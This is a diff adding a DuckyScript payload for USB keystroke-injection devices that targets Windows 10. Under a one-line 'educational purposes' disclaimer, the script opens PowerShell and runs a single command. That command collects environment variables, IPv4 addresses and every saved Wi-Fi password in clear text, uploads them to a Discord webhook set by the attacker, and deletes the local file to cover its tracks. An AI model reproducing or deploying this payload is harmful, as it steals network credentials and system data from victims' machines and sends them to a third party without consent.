@@ -1,0 +1,23 @@
+REM Title:          Discord Windows Wifi IP-Info
+REM Description:    Grabs wifi passwords, environment data, IPv4 Network addresses, writes to a file, uploads it to Discord, then cleans up the file on the targets filesystem and exits. 
+REM Author:         Startrk1995
+REM Props:          Hak5 Team
+REM Version:        1.0
+REM Category:       Exfiltration
+REM Target:         Windows 10 (CMD + Powershell)
+REM Attackmodes:    HID
+REM Mandatory Info: Add your Discord Webhook URL in quotes with no spaces and with permission to post.
+REM Discord URL:    Example: https://discord.com/api/webhooks/123456789012345678/adjlfjlejlidsjasdlijflie_ajsdflkjaljeiljkdajlkjd
+REM Legal:          This script is for educational purposes only please do not use this for malicious purposes
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 1000
+
+REM I have this as all one command for quickness.
+
+STRING $url="YOUR DISCORD WEBHOOK";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit
+ENTER
